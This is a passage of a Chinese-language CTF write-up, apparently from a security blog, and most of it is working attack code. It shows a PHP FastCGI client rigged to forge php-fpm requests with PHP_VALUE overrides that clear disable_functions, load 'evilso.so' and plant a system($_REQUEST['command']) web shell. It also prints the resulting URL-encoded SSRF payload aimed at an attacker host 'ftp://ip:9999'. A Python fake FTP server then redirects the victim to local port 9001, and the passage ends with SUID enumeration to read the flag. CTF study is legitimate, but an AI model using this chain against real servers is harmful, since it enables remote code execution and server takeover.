class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="built_in">self</span>::<span class="variable constant_">HEADER_LEN</span>)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decodePacketHeader</span>(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= <span class="title function_ invoke__">strlen</span>(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildNvpair</span>(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">GET_VALUES</span>, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readPacket</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::<span class="variable constant_">GET_VALUES_RESULT</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNvpair</span>(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">BEGIN_REQUEST</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="title function_ invoke__">chr</span>(<span class="built_in">self</span>::<span class="variable constant_">RESPONDER</span>) . <span class="title function_ invoke__">chr</span>((<span class="keyword">int</span>) <span class="variable">$this</span>-&gt;_keepAlive) . <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildNvpair</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">PARAMS</span>, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">PARAMS</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">STDIN</span>, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">STDIN</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;?file=ftp://ip:9999/&amp;data=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;</span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">FCGIClient</span>(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = evilso.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>; <span class="comment">// extension_dir即为.so文件所在目录</span></span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;ctfking/Tajang&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>, <span class="comment">// 找准服务端口</span></span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>运行后得到如下payload</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">y1.php?file=ftp://ip:下面脚本中的端口/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02H%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%BBPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+evilso.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0ESERVER_SOFTWAREctfking%2FTajang%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure>

<p>vps上起一个假的fpm服务 并用上面的payload诱导victim与vps上的假fpm进行通信</p>
<figure class="highlight python"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9999</span>)) <span class="comment"># 端口可以自己修改 上面的payload也要修改</span></span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2) 注意打到9001端口的服务</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>

<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207182039625.png" alt="image-20220718203945462"></p>
<p>使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>命令查看具有suid权限的文件</p>
<p>可以看到php命令有权限 php-a 进入php交互模式并用刚才绕过openbasedir的payload再执行一次 最后读取flag</p>
]]></content>
      <categories>
        <category>web</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
</search>
